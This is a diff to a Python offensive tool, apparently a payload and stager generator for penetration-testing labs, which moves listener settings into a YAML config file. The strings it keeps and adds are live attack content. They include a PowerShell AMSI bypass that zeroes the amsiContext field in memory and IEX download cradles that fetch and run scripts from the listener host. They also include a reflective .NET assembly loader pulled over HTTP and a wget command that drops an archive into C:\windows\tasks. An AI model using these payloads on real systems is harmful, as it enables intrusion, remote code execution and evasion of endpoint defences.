@@ -3,6 +3,7 @@ import os
 import subprocess
 import netifaces as ni
 from libpinvoke import PINVOKE
+import yaml
 
 # References:
 # https://github.com/plackyhacker/Shellcode-Injection-Techniques
@@ -11,13 +12,20 @@ from libpinvoke import PINVOKE
 
 # Hardcode LHOST if needed
 # LHOST="10.10.14.110"
-LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
-LPORT = "443"
-WEBROOT = "/var/www/html"
+with open('config.yaml', 'r') as file:
+  conf = yaml.safe_load(file)
+
+LHOST = ni.ifaddresses(conf['listener']['interface'])[ni.AF_INET][0]['addr']
+#LHOST = "10.10.10.10"	# Hardcode IP instead
+LPORT = conf['listener']['lport']
+WEBROOT = conf['listener']['webroot']
+
 STAGER_URL = f"http://{LHOST}/sc"
-PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
-PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
 PS_AMSI = r'''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'''
+PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
+PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_class}]::{entrypoint}("".Split())'''
+PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
+PS_UNZIP_CMD = "wget http://{LHOST}/{tool} -o C:\\\\windows\\\\tasks\\\\t.zip;Expand-archive -LiteralPath C:\\\\windows\\\\tasks\\\\t.zip -DestinationPath C:\\\\windows\\\\tasks\\\\"
 
 AMSI_BYPASS_IMPORT = f"""
   // [DllImport("kernel32")]
